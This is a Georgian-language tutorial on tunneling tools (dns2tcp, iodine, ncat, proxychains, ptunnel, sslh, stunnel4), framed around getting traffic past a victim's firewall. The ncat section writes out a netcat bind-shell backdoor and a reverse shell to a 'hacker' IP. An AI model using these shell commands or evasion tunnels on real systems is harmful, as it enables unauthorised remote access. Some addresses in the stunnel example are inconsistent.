# შესავალი

ტუნელინგი არის მეთოდი რომლითაც ხდება ენკაპსულაიცა ერთი ქსელური პროტოკოლის მეორეში. ტუნელინგი პრაქტიკულია დამცვითი მექანიზმების გავლისთვის. ხშირად მსხვერპლს ექნება ფაირვოლი რომელიც გარე კავშირს ბლოკავს რამოდენიმე პროტოკოლის გარდა როგორიცაა HTTP ან DNS-ი. ამ შემთხვევაში, თუ გვსურს რომ გარეთ სვხვა სისტემებს დავუკავშირდეთ, შეგვიძლია რომ ტუნელინგი ფამოვიყენოთ და პაკეტები HTTP პროტოკოლში შევფუთოთ. ფაირვოლი ამ პაკეტებს ნებას დართმევს რომ ქსელი გადალახოს.

# dns2tcp

dns2tcp-ი ახდენს TCP-ს ენკაპსულაცია DNS პროტოკოლში.
ეს ტექნიკა გამოიყენება როცა კავშირის დამყარება მხოლოდ DNS პროტოკოლით არის ნება დართული.
რ0ოცა dns2tcp პროგრამას პაკეტები მოსდის გარკვეულ პორტზე, ეს ყოველივე TCP პაკეტი იგზავნება შორეულ dns2tcp სერვერს DNS პროტოკოლით, და ეს ტრეფიკი შემდეგ გადაიგზავნება გარკვეულ ჰოსტთან, გარკვეულ პორტზე.

dns2tcp არის კლიენტი და სერვერი.
**dns2tcpc** კლიენტია, **dns2tcpd** კი სერვერი.

## სერვერი

სანამ dns2tcp-ს იხმარ, DNS-ის კონფიგურირებით უნდა შექმნა NS აღრიცხვა რომელშიც მითითებული იქნება dns2tcp-ს სერვერის საჯარო IP მისამართი.
სასარგებლო იქნება სუბდომენის შექმნა, მაგალითად dnstunnel.example.com dns2tcp-ისთვის.

შემდფომ dns2tcp სერვერის კონფიგურირებაა საჭირო. dns2tcp სერვერი დავდაპირველად ეძებს კონფიგრაციის ფაილს სახელად .dns2tcprcd შენი მომხმარებლის პაპკაში.

შექმენი ფაილი /etc/dns2tcpd.conf:

```
> cat /etc/dns2tcpd.conf
listen = 0.0.0.0
port = 53
user = nobody
chroot = /tmp
domain = dnstunnel.example.com
resources = ssh:127.0.0.1:22
```

გაუშვი dns2tcp სერვერი:

```
> dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf
```

პარამეტრების ახსნა განმარტება:
  * -F : უშვებს წინაპლანზე (Foreground)
  * -d 1:  debug level
  * -f /etc/dns2tcpd.conf : მიუთითებს კონფიგურაციის ფაილს

## კილენტი

შექმენი ფაილი /etc/dns2tcpc.conf.

```
> cat /etc/dns2tcpc.conf
domain = dnstunnel.example.com
resource = ssh
local_port = 2222
debug_level=1
```

დაიწყე ტუნელინგი:

```
> dns2tcpc -z dnstunnel.example.com -c -f /etc/dns2tcpc.conf
```

რომ გამართო SSH სესია:

```
> ssh -p 2222 your_username@127.0.0.1
```

თუმც შეგიძლიათ რომ გააგზავნოთ იმდენი პაკეტი რამდენიც გინდათ DNS-ის მეშვეობით, უნდა იცოდეთ რომ ეს ტუნელი არ არის შიფრირებული, და მაშიც შეიძლება გაწყობდეთ პაკეტების შიფრაცია გაგაზავნამდე.

# iodine

iodine-ს შეუძლია IPv4-ს ტრეფიკის ენკაპსულაცია DNS პროტოკოლში.

## DNS კონფიგურირება

თუ ფლობ DNS დომენს, შექმენი ქვედომენი ტუნელინგისთვის (tunnel.example.com).
BIND-ში დაუმატე ეს 2 ხაზი example.com ზონის ფაილში.

```
dns      IN   A    192.168.200.1
tunnel   IN   NS   dns.example.com
```

პირველ ხაზსში ვქმნით DNS-ის ქვედომენის A აღწერას.
მეორე ხაზსში ვაფიქსირებთ რომ tunnel-ის ქვედომენის DNS-ია dns.example.com.
iodine სერვერის IP მისამართია 192.168.200.1.

შეინახე ფაილი და ხელახლა გაუშვი BIND სერვერი.

## iodine სერვერის გაშვება

```
> iodined -f -c -P password 192.168.200.1 tunnel.example.com
```

პარამეტრების ახსნა განმარტება:
  * -f: პროცეს უშვებს წინა პლანზე (foreground)
  * -c: არ ამოწმებს კლიენტის IP მისამართს პაკეტის მიღების დროს (checking)
  * -P: აწესებს პაროლს კავშირისთვის (password)

## iodine კლიენტის გაშვება

კლიენტ სისტემაში გაუშვებ:

```
> iodine -f -P password tunnel.example.com
```

სერვერიდან კლიენტი მიიღებს IP მისამართს

# ncat

ncat არის ზოგადი დანიშნულების ქსელური პოგრამა რომლის საშუალებით შესაძლოა მონაცემების გაგზავნა, მიღება და შიფრაცია. ეს არის netcat-ის გაუმჯობესებული ვერსია, მის შესაძლებლობებში შედის:
  * იყოს TCP/UDP/SCTP/SSL მარტივი კლიენტი ვებ სერვერებთან და სხვა TCP/IP ქსელურ სერვისებთან კავშირისთვის
  * TCP/UDP/SCTP/SSL მარტივი სერვერი
  * TCP/UDP/SCTP პროქსი, ტრეფიკის გაგზავნით სხვა ჰოსტთან გარკვეულ პორტზე
  * სისტემის ბრძანებების გასაშვებად ქსელური შუამავალი
  * მონაცემების შიფრაციაკავშირის დროს SSL-ის მეშვეობით
  * ქსელური კავშირის დამყარება IPv4 ან IPv6 პროტოკოლით
  * იოს კავშირის შუამავალი, რაც საშუალებას აძლევს ბევრ სხვა კლიენტს რომ ერთმანეთს დაუკავშირდნენ ამ შუამავლით

  * ჰაკერის IP მისამართია 168.0.0.2
  * მსხვერპლის IP მისამართია 168.0.0.10

მსხვერპლის სისტემაში გაუშვი ncat რომ კავშირს ელოდოს (-l, listen), 1337 პორტზე (-p, port) და გაუშვას შელი (-e, execute):

```
> nc -l -p 1337 -e /bin/sh
```

ჰაკერის სისტემიდან ვუკაშირდებით მსხვერპპლის სისტემას რომ მიწვდომა გვქონდეს ბექდორთან:

```
> nc 168.0.0.10 1337
```

## უკუღმა შელი

უკუშელი (reverse shell) გაძლევს საშუალებას რომ მსვერპლის სისტემა დაუკავშირდეს ჰაკერის სისტემას.

ჰაკერის სისტემაში ვუშვებთ ncat-ს რომ კავშირს ელოდოს 1337 პორტზე:

```
> nc -l 1337
```

მსვერპლის სისტემაში:

```
> nc 168.0.0.2 1337 –e /bin/sh
```

ჰაკერის სისტემაში ვუშვებთ ncat-ს და შემდგომ სასურველ ბრანებებს:

```
> nc -l -p 1337
whoami
```

# proxychains

proxychains შეუძლია ყოველივე TCP კლიენტს აიძულოს ტრფიკის მიმოქცევა პროქსის მეშვეობით მოხდეს. მას კავშირის დამყარება შეუძლია SOCKS4, SOCKS5, და HTTP CONNECT პროქსი სერვერბთან.

proxychains-ის კონფიგურაციის ფაილია /etc/proxychains.conf.

Kali Linux-ში იგი კონფიგურირებულია რომ tor-ი იხმაროს.

ვქნათ telnet-ი პროქსიფიკაცია:

```
> proxychains telnet example.com
```

ეს ნიშნავს რომ ბრძანება telnet-ი პროქსირირებული იქნება იმ პროქსის მეშვეობით რომელიც proxychains-ის კონფიგურაციის ფაილშია სანამ example.com-ს დაუკავშირდება.

# ptunnel

ptunnel-ს შეუძლია TCP-ს ენკაპსულაცია ICMP echo (ping requests) და ICMP reply (ping reply) პაკეტებში.
ეს ხელსაყრელია თუ შეგიძლია რომ იხმარო პინგი და აკრძალურია TCP და UDP პაკეტების გაგზავნა. ამ შემთხვევაში, ptunnel-ით შეგიძლია რომ ინტერნეტს ეწვიო.

რომ იხმარო ptunnel-ი, უნდა დააკონფიგურირო პროქსი სერვერი.
თუ გინდა რომ ptunnel-ი იხმარო ინტერნეტიდან უნდა დააკონფიგურირო ptunnel სერვერი IP მისამართით რომელიც მისაწვდომი იქნება ინტერნეტიდან.

გაუშვი ptunnel სერვერი:

```
# ptunnel
```

გამოყენება კლიენტის ფორმით:

```
# ptunnel -p ptunnel.example.com -lp 2222 -da ssh.example.org -dp 22
```

გაუშვი ssh-ი რომ ssh.example.org-ს დაუკავშირდე:

```
# ssh localhost -p 2222
```

**ყურადღება:** თუ გინდა რომ ptunnel-ის გამოყენება დაცული იყოს შეგიძლია რომ იხმარო პაროლი -x პარამეტრით, იგივე პაროლი უნდა იყოს კლიენტისთვის და სერვერისთვის.

# sslh

sslh არის SSL/SSH მულტიპლექტორი. იგი ელოდება კავშირის დამყარებას სპეციფიკურ პორტზე და გადააგზავნის პაკეტებს მიღებული პაკეტის ტესტირების შემდგომ.
მისი მხარდაჭერილი პროტოკოლებია HTTP, HTTPS, SSH, OpenVPN, tinc, და XMPP.

სანამ sslh-ს იხმარ შენი ვებ სერვერი უნდა დააკონფიგურირო ისე რომ კავშირს ელოდებოდეს localhost-ზე მე-443 პორტზე.
აპაჩისთვის გახსენი /etc/apache2/ports.conf, mod_ssl სექცია უნდა იყოს ესე:

```
<IfModule ssl_module>
Listen 127.0.0.1:443
</IfModule>
```

შემდეგ sslh-ის კონფიგურირებაა საჭირო, გახსენი ფაილი /etc/default/sslh და Run=no-ს მაგივრად ჩაწერე Run=yes.

გაუშვი sslh-ი:

```
# /etc/init.d/sslh start
```

რომ დარწმუნდე რომ sslh-ი გაშვებულია:

```
# ps -ef | grep sslh
```

შეგვიძლია დავუკავშირდეთ ssh-ით 443-მე პორტზე სხვა კომპიუტერიდან:

```
# ssh -p 443 root@192.168.2.5
```

# stunnel4

stunnel4-ი არის ხელსაწყო რომელიც TCP პროტოკოლის შიფრაციას ახდენს SSL-ის მეშვეობით. შესაძლოს ხდის რომ SSL-ის ფუნქცია დაუმატო პროტკოლებს რომლებიც არ არიან თავდაპირველად გათვლილი SSL-ის მხარდასაჭერად, პროტოკოლები როგოიცაა MySQL, Samba, POP3, IMAP, SMTP, და HTTP.

მაგალითად stunnel4-თ ვქნათ MySQL-თან კავშირის შიფრაცია.

  * კლიენტის IP მისამართია: 168.0.0.10
  * სერვერის IP მისამართია: 168.0.0.20

## სერვერის კონფიგურირება

  * შექმენი ssh სერთიფიკატი და გასაღები

```
# openssl req -new –days 365 -nodes -x509 -out /etc/stunnel/
stunnel.pem -keyout /etc/stunnel/stunnel.pem
```

  * დააკონფიგურე stunnel4-ი რომ ელოდოს შიფრულ კავშირს მე-3307 პორტზე და ტრეფიკი გადაუგზავნოს MySQL-ს მე-3306 პორტზე localhost-ში

```
# cat /etc/stunnel/stunnel.conf :
cert = /etc/stunnel/stunnel.pem
setuid = stunnel4
setgid = stunnel4
pid = /var/run/stunnel4/stunnel4.pid
[mysqls]
accept = 0.0.0.0:3307
connect = localhost:3306
```

  * ნება დართვი stunnel4-ის ავტომატურად გაშვებას /etc/default/stunnel4-ში:

```
ENABLED=1
```

  * გაუშვი stunnel4 სერვისი

```
# /etc/init.d/stunnel4 start
Starting SSL tunnels: [Started: /etc/stunnel/stunnel.conf] stunnel
```

  * შეამოწმე რომ stunnel4 უსმენს მე-3307 პორტზე

```
# netstat -nap | grep 3307

tcp         0   0 0.0.0.0:3307              0.0.0.0:*
LISTEN      8038/stunnel4
```

## კლიენტის კონფიგურირება

  * დააკონფიგურე stunnel4-ი რომ ელოდოს შიფრულ კავშირს მე-3307 პორტზე და ტრეფიკი გადაუგზავნოს MySQL-ს მე-3306 პორტზე სერვერს.

```
# cat /etc/stunnel/stunnel.conf :
client = yes
[mysqls]    accept = 3306   connect = 192.168.2.21:3307
```

  * ნება დართვი stunnel4-ის ავტომატურად გაშვებას /etc/default/stunnel4-ში:

```
ENABLED=1
```

* გაუშვი stunnel4 სერვისი

```
# /etc/init.d/stunnel4 start
Starting SSL tunnels: [Started: /etc/stunnel/stunnel.conf] stunnel
```

  * შეამოწმე რომ stunnel4 უსმენს მე-3307 პორტზე

```
# netstat -napt | grep stunnel4

tcp         0   0 0.0.0.0:3306              0.0.0.0:*
LISTEN      2860/stunnel4
```

  * დაუკავშირდი MySQL სერვერს

```
# mysql -u root -h 127.0.0.1
```

ეხლა MySQL-ში რომ გაუშვა ბრძანება <code>show databases;</code> და ტრეფიკის სნიფინგი ქნა, ნახვა რომ ტრეფიკი შიფრულია.

სნიფინგით შეგიძლია წააწყდე ბერვრ ინფორმაციას, მაგალითად მონაცემების ბაზის სერვერის სახელს და ვერსიას, ოპერაციულ სისტემას, მომხმარებლის კლიჩკას, და ბეზების სახელწოდებებს.